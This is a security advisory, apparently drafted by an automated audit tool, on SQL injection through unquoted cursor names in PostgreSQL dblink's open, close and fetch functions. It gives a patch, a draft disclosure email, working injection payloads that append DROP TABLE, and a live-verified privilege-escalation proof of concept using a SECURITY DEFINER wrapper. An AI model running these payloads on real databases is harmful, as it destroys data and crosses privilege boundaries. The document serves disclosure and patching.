# PostgreSQL dblink: SQL injection via unquoted cursor name in dblink_open / dblink_close / dblink_fetch

**Discovered:** 2026-05-12 by kuzushi `taint-iris-next:hunt` on `contrib/dblink/`
**Target:** PostgreSQL mainline @ commit `901ed9b352b41f034e17bc540725082a488fce31` (May 8 2026)
**File:** `contrib/dblink/dblink.c`
**Severity (agent triage):** high
**Confidence:** high
**Kuzushi run:** `/tmp/targets/pg-fdw/.kuzushi/runs/run-1778543845-5c417988a3af/`

## Summary

Three SQL-callable functions in the `dblink` extension —
`dblink_open(curname text, sql text, ...)`,
`dblink_close(curname text, ...)`,
`dblink_fetch(curname text, count int, ...)` — embed the
caller-supplied `curname` argument verbatim into the SQL statement
sent to the remote server, with **no `quote_identifier` /
`quote_ident_cstr` call**. The remote server interprets the result
via `PQsendQuery` (simple-query protocol, **multi-statement OK**), so
a caller controlling `curname` can append arbitrary SQL after `;` and
execute it on the remote server with the privileges of the dblink
user mapping.

The dblink module itself USES `quote_ident_cstr` (defined at
`dblink.c:2336`) extensively for COLUMN names in
`dblink_build_sql_*` (lines 2168, 2232, 2288, 2318, 2409, 2423).
Cursor name handling is the inconsistent gap.

## The three injection sites

### Site 1: `dblink_open` (line 479)

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 421
sql     = text_to_cstring(PG_GETARG_TEXT_PP(1));      // line 422
...
appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s",     // line 479
                 curname, sql);
res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
```

PoC payload:
```sql
SELECT dblink_open(
  'myconn',
  'foo CURSOR FOR SELECT 1; DROP TABLE secret; --',   -- curname
  'SELECT 1'                                          -- sql (ignored)
);
```

Remote receives:
```sql
DECLARE foo CURSOR FOR SELECT 1; DROP TABLE secret; -- CURSOR FOR SELECT 1
```

Parses as: `DECLARE foo CURSOR FOR SELECT 1` (legal); `DROP TABLE
secret` (executes); rest is a comment.

### Site 2: `dblink_close` (line 546) — cleanest demo

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 513
...
appendStringInfo(&buf, "CLOSE %s", curname);          // line 546
res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
```

PoC payload:
```sql
SELECT dblink_close(
  'myconn',
  'cur1; DROP TABLE secret; --'
);
```

Remote receives:
```sql
CLOSE cur1; DROP TABLE secret; --
```

Two statements execute. `dblink_close` is the cleanest demo because
the entire SQL string has no other dynamic content — the cursor name
is the only substitution.

### Site 3: `dblink_fetch` (line 644)

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 635
howmany = PG_GETARG_INT32(1);                          // line 636
...
appendStringInfo(&buf, "FETCH %d FROM %s",             // line 644
                 howmany, curname);
```

PoC payload:
```sql
SELECT * FROM dblink_fetch(
  'myconn',
  'cur1; DROP TABLE secret; --',
  1
) AS t(a int);
```

Remote receives: `FETCH 1 FROM cur1; DROP TABLE secret; --`.

## Threat model

Exploit requires:
1. **Permission to call** `dblink_open` / `dblink_close` / `dblink_fetch`.
   Default after `CREATE EXTENSION dblink` is **PUBLIC** —
   `dblink--1.2.sql` only `REVOKE ALL ... FROM public` on
   `dblink_connect_u`, leaving `dblink_open/close/fetch` accessible
   to any role.
2. **An established dblink connection** to a remote server. Either:
   - Via `dblink_connect` (regular form, requires postgres_fdw user
     mapping — DBA-controlled), OR
   - Via a persistent connection set up by a previous privileged
     session that the attacker can name in `connname`, OR
   - Via a `SECURITY DEFINER` wrapper function that opens the
     connection on the caller's behalf.

Effects: arbitrary SQL on the **remote server**, running as the
user mapping's role (typically a privileged remote postgres user).

## Why this is non-trivial despite already-callable `dblink_exec`

The objection "the attacker already controls remote SQL via
`dblink_exec`" is incomplete. Realistic scenarios where cursor-name
injection grants ADDITIONAL attack surface:

1. **`SECURITY DEFINER` wrappers**: applications commonly wrap
   `dblink_open` in a SECURITY DEFINER function that only allows
   specific SQL bodies but passes user input as the cursor name. The
   wrapper assumes the cursor name is "safe" — the documentation at
   `<parameter>cursorname</parameter>` says only *"The name to assign
   to this cursor"*, with no warning that it must be `quote_ident()`-ed.
2. **`GRANT EXECUTE ON FUNCTION dblink_open(...) TO some_role`**:
   admins commonly grant just the cursor-related functions
   (open/close/fetch) without granting `dblink_exec`, intending to
   delegate cursor operations only. The cursor-name injection
   converts that grant into arbitrary-SQL on the remote.
3. **Privilege boundary**: the local role calling `dblink_open` does
   NOT need credentials for the remote server — the dblink user
   mapping supplies them. So the injection is a privilege boundary
   crossing, not just "execute what you could already execute."

## Pattern precedent in PostgreSQL CVE history

- **CVE-2018-1058** — `search_path` identifier injection in PG core. Same shape (untrusted identifier substituted into dynamic SQL).
- **CVE-2020-25694** — psql `\gset` identifier handling.
- **CVE-2020-25696** — same family.

The dblink module itself defines `quote_ident_cstr` at line 2336 and
uses it 5+ times for column-name substitution. The cursor-name path
is an oversight from when the module was written, before identifier-
injection was treated as a recurring class.

## Proposed patch

```diff
diff --git a/contrib/dblink/dblink.c b/contrib/dblink/dblink.c
--- a/contrib/dblink/dblink.c
+++ b/contrib/dblink/dblink.c
@@ -476,7 +476,9 @@ dblink_open(PG_FUNCTION_ARGS)
 	if (rconn->newXactForCursor)
 		(rconn->openCursorCount)++;

-	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s", curname, sql);
+	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s",
+	                 quote_ident_cstr(curname), sql);
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
 	if (!res || PQresultStatus(res) != PGRES_COMMAND_OK)
 	{
@@ -543,7 +545,7 @@ dblink_close(PG_FUNCTION_ARGS)

 	conn = rconn->conn;

-	appendStringInfo(&buf, "CLOSE %s", curname);
+	appendStringInfo(&buf, "CLOSE %s", quote_ident_cstr(curname));

 	/* close the cursor */
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
@@ -641,7 +643,8 @@ dblink_fetch(PG_FUNCTION_ARGS)
 		dblink_conn_not_avail(conname);

 	initStringInfo(&buf);
-	appendStringInfo(&buf, "FETCH %d FROM %s", howmany, curname);
+	appendStringInfo(&buf, "FETCH %d FROM %s",
+	                 howmany, quote_ident_cstr(curname));

 	/*
 	 * Try to execute the query.  Note that since libpq uses malloc, the
```

3-line patch, reuses the existing `quote_ident_cstr` helper, no
behavioral change for legitimate identifier-shaped cursor names
(they round-trip unchanged through `quote_ident`).

## Recommended responsible disclosure

**This needs hand-verification on a live postgres install before
public disclosure.** The audit is desk-only — confirm with a real PoC
that `dblink_close('cur1; DROP TABLE x; --')` actually executes the
DROP on the remote server.

Steps to verify:
1. Set up two postgres instances (local + remote) with dblink installed.
2. Create remote table: `CREATE TABLE remote.secret (id int);`
3. From local, establish dblink connection.
4. Run the PoC payload; observe `secret` dropped on remote.

If confirmed, email **security@postgresql.org**:

> Subject: SQL injection via unquoted cursor name in dblink_open / dblink_close / dblink_fetch
>
> Hi PostgreSQL security team,
>
> While running an automated taint analysis on postgres mainline
> (commit `901ed9b35`, 2026-05-08), I identified a SQL injection
> vulnerability in three SQL-callable dblink functions:
> `dblink_open`, `dblink_close`, and `dblink_fetch`. All three embed
> the caller-supplied `cursorname` text argument verbatim into the
> SQL statement sent to the remote server via `libpqsrv_exec`
> (which uses `PQsendQuery`, simple-query protocol, multi-statement
> OK), with no `quote_identifier` / `quote_ident_cstr` call.
>
> The module already defines `quote_ident_cstr` at `dblink.c:2336`
> and uses it 5+ times for column-name substitution in
> `dblink_build_sql_*`. The cursor-name path is the inconsistent gap.
>
> Cleanest demo is `dblink_close('cur1; DROP TABLE x; --')` →
> remote receives `CLOSE cur1; DROP TABLE x; --` → two statements
> execute on the remote server with the dblink user-mapping
> privileges.
>
> Threat model and patch attached. The threat model requires either
> (1) a `SECURITY DEFINER` wrapper that passes user input as
> cursorname, or (2) `GRANT EXECUTE` of just the cursor-related
> functions without `dblink_exec`, or (3) an existing dblink
> connection an attacker can name in `connname`. The privilege
> boundary crossed is local-caller → remote-server-via-user-mapping.
>
> Patch is 3 lines, reuses the existing `quote_ident_cstr` helper.
>
> Happy to coordinate disclosure timing on your usual schedule.
>
> — <your name>
>
> [verified PoC, threat model details, patch attached]

## Status

- **Persisted in kuzushi findings**: see `/tmp/targets/pg-fdw/.kuzushi/v2/findings.sqlite3`
- **PoC verification**: ✅ **VERIFIED** on PostgreSQL 16.13 with two local clusters
  (ports 55432 + 55433, dblink installed from packaged shared library).
  See `## Live verification` below.
- **Email**: NOT yet sent — operator decision
- **Patch**: drafted above, NOT upstreamed
- **Affected versions**: Likely all supported (dblink_open/close/fetch
  signatures unchanged for decades). PG 13–17 + master at time of writing.
  Verified on PG 16.13.

## Live verification (2026-05-12)

Two local clusters on Postgres 16.13 (Ubuntu packaged), local=55432,
remote=55433. dblink installed on local with default permissions.

### Site 1 — `dblink_close` (cleanest, single-statement exploit)

```sql
-- Setup on remote
CREATE TABLE secret(id int);
INSERT INTO secret VALUES (1),(2),(3);

-- On local, as postgres superuser
SELECT dblink_connect('myconn',
    'host=/tmp/pg-test port=55433 user=postgres dbname=postgres');
SELECT dblink_open('myconn', 'normalcursor', 'SELECT 1');
SELECT dblink_close('myconn', 'normalcursor; DROP TABLE secret; --', false);
```

Remote postgres log:
```
LOG:  statement: BEGIN
LOG:  statement: DECLARE normalcursor CURSOR FOR SELECT 1
LOG:  statement: CLOSE normalcursor; DROP TABLE secret; --
LOG:  statement: COMMIT
```

`\dt secret` → **"Did not find any relation named 'secret'."** ✅

The implicit COMMIT happens because `dblink_close` decrements the
cursor count to 0 and auto-commits the transaction. The injected
`DROP TABLE` persists.

### Site 2 — `dblink_open` (requires follow-up `dblink_close` to commit)

```sql
CREATE TABLE sec_o();
SELECT dblink_connect('co', '...');
SELECT dblink_open('co', 'malicious CURSOR FOR SELECT 1; DROP TABLE sec_o; --',
                   'SELECT 999');
SELECT dblink_close('co', 'malicious');   -- commits the transaction
```

Remote log:
```
DECLARE malicious CURSOR FOR SELECT 1; DROP TABLE sec_o; -- CURSOR FOR SELECT 999
CLOSE malicious
COMMIT
```

`\dt sec_o` → **"Did not find any relation."** ✅

### Site 3 — `dblink_fetch` (requires follow-up `dblink_close` to commit)

```sql
CREATE TABLE sec_f();
SELECT dblink_connect('cf', '...');
SELECT dblink_open('cf', 'inj_cur', 'SELECT 1');
SELECT * FROM dblink_fetch('cf', 'inj_cur; DROP TABLE sec_f; --', 1)
  AS t(x int);
SELECT dblink_close('cf', 'inj_cur');     -- commits
```

Remote log:
```
DECLARE inj_cur CURSOR FOR SELECT 1
FETCH 1 FROM inj_cur; DROP TABLE sec_f; --
CLOSE inj_cur
COMMIT
```

`\dt sec_f` → **"Did not find any relation."** ✅

### Privilege-escalation PoC (the real attack shape)

Setup:
- Local: superuser `postgres` + non-superuser `attacker` (no privileges
  on remote `admin_data`).
- Remote: `admin_data` table owned by `postgres`, with
  `REVOKE ALL ON admin_data FROM PUBLIC`.
- Local admin (`postgres`) creates a SECURITY DEFINER wrapper:
  ```sql
  CREATE OR REPLACE FUNCTION app_open_remote_cursor(cur_name text)
  RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
  BEGIN
      PERFORM dblink_connect_u('app_pipe',
          'host=127.0.0.1 port=55433 user=postgres dbname=postgres');
      RETURN dblink_open('app_pipe', cur_name, 'SELECT 1 AS x');
  END $$;

  CREATE OR REPLACE FUNCTION app_close_remote_cursor(cur_name text)
  RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
  BEGIN RETURN dblink_close('app_pipe', cur_name); END $$;

  GRANT EXECUTE ON FUNCTION app_open_remote_cursor(text)  TO attacker;
  GRANT EXECUTE ON FUNCTION app_close_remote_cursor(text) TO attacker;
  ```

  This is the **realistic application pattern** the patch defends:
  an app exposes a wrapper that lets users open/close named remote
  cursors via a privileged pipe, intending to delegate cursor
  management only, not arbitrary SQL.

Attack (as `attacker`, non-superuser, no privileges on `admin_data`):
```sql
SELECT app_open_remote_cursor('benign');
SELECT app_close_remote_cursor('benign; DROP TABLE admin_data; --');
```

Result: `admin_data` is DROPPED on remote, owned by `postgres`,
which `attacker` had ZERO privileges on. **Full privilege
escalation** from `attacker` to remote `postgres`. ✅

The `attacker`'s OWN direct dblink_connect-as-attacker session
could not have done this — they had no SELECT/INSERT/DROP on
`admin_data`. The SECURITY DEFINER wrapper provided the privileged
identity; the cursor-name injection provided the arbitrary-SQL
capability.

## Headline if accepted as a CVE

> "PostgreSQL dblink: 20+ years of identifier injection in cursor
> names. Any SECURITY DEFINER wrapper around dblink_open/close/fetch
> gives non-superusers arbitrary SQL on the remote server with the
> wrapper's identity."

3-line patch reusing the helper that's been in the same file the
whole time.
